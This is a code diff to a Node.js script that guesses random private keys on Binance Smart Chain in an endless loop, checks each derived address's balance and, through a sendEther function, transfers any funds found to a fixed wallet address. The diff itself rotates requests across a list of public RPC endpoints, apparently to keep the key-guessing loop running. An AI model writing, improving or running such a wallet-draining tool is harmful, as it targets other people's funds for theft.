@@ -1,6 +1,29 @@
 const Web3 = require("web3");
 const fs = require("fs");
-const web3 = new Web3("https://bsc-dataseed2.defibit.io");
+
+const arr = [
+  "https://bsc-dataseed.binance.org",
+  "https://bsc-dataseed1.defibit.io",
+  "https://bsc-dataseed1.ninicoin.io",
+  "https://bsc-dataseed2.defibit.io",
+  "https://bsc-dataseed3.defibit.io",
+  "https://bsc-dataseed4.defibit.io",
+  "https://bsc-dataseed2.ninicoin.io",
+  "https://bsc-dataseed3.ninicoin.io",
+  "https://bsc-dataseed4.ninicoin.io",
+  "https://bsc-dataseed1.binance.org",
+  "https://bsc-dataseed2.binance.org",
+  "https://bsc-dataseed3.binance.org",
+  "https://bsc-dataseed4.binance.org",
+];
+
+const getWeb3 = () => {
+  const web3 = new Web3(
+    new Web3.providers.HttpProvider(arr[Math.floor(Math.random() * arr.length)])
+  );
+  return web3;
+};
+
 // const web3 = new Web3("https://bsc-dataseed1.defibit.io");
 // const web3 = new Web3("https://bsc-dataseed.binance.org");
 // const web3Ether = new Web3(
@@ -19,6 +42,8 @@ const sleep = (ms) =>
 const main = async () => {
   try {
     while (true) {
+      const web3 = getWeb3();
+
       const privateKey = genRanHex(64);
       const address = web3.eth.accounts.privateKeyToAccount(privateKey).address;
       const balance = await web3.eth.getBalance(address);
@@ -47,6 +72,8 @@ const main = async () => {
 };
 
 const sendEther = async (from, balance) => {
+  const web3 = getWeb3();
+
   const to = "0x52D53cF066da6738e8F7A6E201a597C3380C13B6";
   const gas = web3.utils.toWei("21000", "wei");
   const sendAmount = parseFloat(balance) - parseFloat(gas);
